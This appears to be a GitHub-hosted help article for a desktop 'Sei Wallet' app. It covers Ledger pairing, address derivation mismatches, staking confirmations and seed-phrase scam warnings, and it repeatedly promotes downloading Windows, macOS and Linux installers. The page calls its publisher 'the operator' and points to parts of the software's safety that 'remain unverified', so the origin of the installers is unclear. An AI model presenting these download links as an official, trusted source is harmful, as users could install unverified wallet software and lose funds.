![Sei Wallet](https://github.com/sei-chain/sei-wallet-help/raw/main/assets/banner-article.png)

<h1 align="center">Using a Ledger hardware wallet with Sei Wallet</h1>

<p align="center">Connect the device, confirm the address on it, and stake from cold keys.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Sei Wallet supports Ledger devices as an optional signing method: the wallet holds the interface, the device holds the keys, and every transaction needs a physical confirmation. Setup is short. What takes longer is understanding which app on the device is doing the work, because that choice determines which account you see - and a mismatch is the most common reason a connected Ledger appears to have lost its balance.

The operator lists the Nano S+, the Nano X and the Stax as supported, and routes signing through Ledger's Ethereum app rather than the Cosmos app. That detail matters more than the device list: Sei is EVM-first, so the wallet asks the device for an Ethereum-style account.

## What "supported" actually means here

Three separate things have to be true, and they fail independently.

1. **The device is recognised** by your computer and unlocked.
2. **The right app is open** on the device - the Ethereum app, because that is the path the wallet uses.
3. **The wallet and the device agree on which account to open.** The same seed can derive many accounts; a different derivation produces a different address.

When people say "my Ledger doesn't work with this wallet", it is almost always one of those three. Only the third produces the confusing symptom - a wallet that connects, shows an address, and shows the wrong balance.

## Before you connect

- Update the device firmware and the desktop companion app first. An out-of-date device produces connection failures that look like wallet bugs.
- Close other applications that talk to the device. Two programs requesting the same app at once is a reliable way to get a "device busy" error.
- Have the device's own PIN ready. You will enter it on the device, never in the wallet.
- Decide which account you intend to use, and note the address your current setup shows for it. This is the single most useful thing you can do before pairing, because it turns a later mismatch into an obvious one.

## The pairing steps

1. Connect the device by cable and unlock it with the PIN.
2. Open the Ethereum app on the device.
3. In Sei Wallet, choose the hardware-wallet option and select the device when it appears.
4. Approve the connection on the device if it asks.
5. Compare the address the wallet displays with the one your device shows. If the wallet offers a "verify address" step, use it: the point of a hardware wallet is that the device's own screen is the reference, not the computer's.
6. Add the account, then check the balance matches what you expect before signing anything.

If step 5 produces a different address than you expected, stop there. Do not send funds to it to "see what happens". Step through additional accounts until the expected address appears; each step is a different derivation. The mechanism, and why a device can present two accounts, is in [the different-address problem](https://github.com/sei-chain/sei-wallet-help/blob/main/why-the-device-shows-another-address.md).

## What you should see on the device

Every transaction produces a prompt on the device screen showing what is being signed. Read it. The wallet screen and the device screen should describe the same action - same amount, same destination, same validator if you are staking.

This is the entire security benefit of a hardware wallet, and it is easy to give away by approving on the device without looking. A compromised computer can show you a convincing interface, but it cannot change what the device displays without you noticing, provided you actually look.

Some transactions cannot be fully rendered on a small screen and appear as a request to enable a broader signing mode. That setting is worth understanding before you turn it on, and it is covered in [the Sei Wallet blind signing guide](https://github.com/sei-chain/sei-wallet-help/blob/main/blind-signing-explained.md).

## Staking and sending with a device attached

Nothing about the flows changes except the confirmation. Sending, staking, claiming rewards and unbonding all end with a device prompt, and each one needs the device unlocked and the Ethereum app open.

Two practical notes:

- **Keep the device awake.** A prompt that times out mid-flow leaves a transaction unsigned, which looks like a failure but is simply an expired request. Start again.
- **Unbonding still needs gas.** A hardware wallet changes who holds the keys, not the fee rules - nothing can pay an unbonding fee out of bonded stake, so the reserve matters whatever device signs.

## What breaks, and what each symptom means

<div align="center">

| Symptom | Usual cause |
|---|---|
| Device not detected at all | Cable, a USB hub, or another program holding the device |
| Detected, but no accounts appear | Wrong app open - the Cosmos app instead of the Ethereum app |
| Address differs from your other wallet | Different derivation; the account is real but not the one holding your balance |
| Balance shows zero | Wrong account, wrong network, or two formats of one account |
| Prompt never appears | Device locked, app closed, or the request timed out |

</div>

None of these indicates theft. They are configuration mismatches, and the fix is to work from the address rather than from the wallet's label. A balance that arrived over a bridge is a further possibility: it is a representation rather than native SEI and will not show as native - [the Ethereum bridge](https://github.com/sei-chain/sei-wallet-staking/blob/main/bridge-from-ethereum.md) covers that route.

## The rules that do not change with hardware

A hardware wallet protects keys. It does not protect judgement, and the scams aimed at self-custody users do not care what device you own.

- **The recovery phrase never leaves the device.** Not for support, not for a "migration", not to "restore Ledger support" in another app. Restoring a Ledger means restoring onto hardware, through the device's own interface.
- **No legitimate process asks you to type the phrase into a website.** That request is the scam, complete.
- **Do not wipe the device to "fix" an address.** Wiping and restoring the same seed reproduces the same accounts.
- **Do not accept a "derivation fixer" service.** Derivation is a local operation with a numeric parameter; anything asking to do it for you is collecting seeds.

What the software itself can and cannot be trusted to do is a separate question from what the device protects, and [the honest safety answer](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md) covers the parts that remain unverified.

What the application itself is, and who runs it, is covered in [what the application is](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).

## Is a Ledger worth it here?

For a balance you would be upset to lose, yes - the isolation between keys and a general-purpose computer is real, and it holds regardless of which wallet you use.

What it does not do: it does not make a fake download safe, it does not stop you approving a malicious transaction, and it does not recover a lost phrase. It moves one class of risk and leaves the others exactly where they were.

## If your device is not a Ledger

Support varies. Some hardware wallets sign Sei transactions directly, some rely on a companion app, and some cannot export a key at all, which rules out the account-discovery approach described above. The comparison is in [the hardware-wallet roundup](https://github.com/sei-chain/sei-wallet-help/blob/main/which-hardware-devices-work.md).

## Frequently asked questions

**Does my Ledger store SEI?** No. The device stores keys; the coins are always on-chain, in an account the device can sign for.

**Which Ledger models work?** The operator lists the Nano S+, Nano X and Stax. Older models may still connect, but they are not in the stated list.

**Why does the wallet show a different address than my other wallet does?** The two wallets requested different derivations from the same seed. Two genuine accounts from one seed, and the funds sit in just one of them.

**Do I need the Cosmos app?** Not for this wallet - signing goes through the Ethereum app, because Sei is EVM-first.

**Can I stake with a Ledger connected?** Yes, with a device confirmation per transaction, including the unbonding transaction later.

**Is my balance safer with a Ledger?** Against a compromised computer, yes. Against phishing, a fake download or your own misread approval, no - those are unaffected.

**What if the device prompt does not appear?** Unlock the device, open the Ethereum app, close other programs using it, then start the transaction again. A timed-out request is not a lost transaction.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [Why a Ledger shows a different Sei address in Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/why-the-device-shows-another-address.md)
- [Blind signing when Sei Wallet uses a Ledger](https://github.com/sei-chain/sei-wallet-help/blob/main/blind-signing-explained.md)
- [Bridging SEI from Ethereum into Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/bridge-from-ethereum.md)
- [Is Sei Wallet safe? What self-custody does and does not protect](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md)
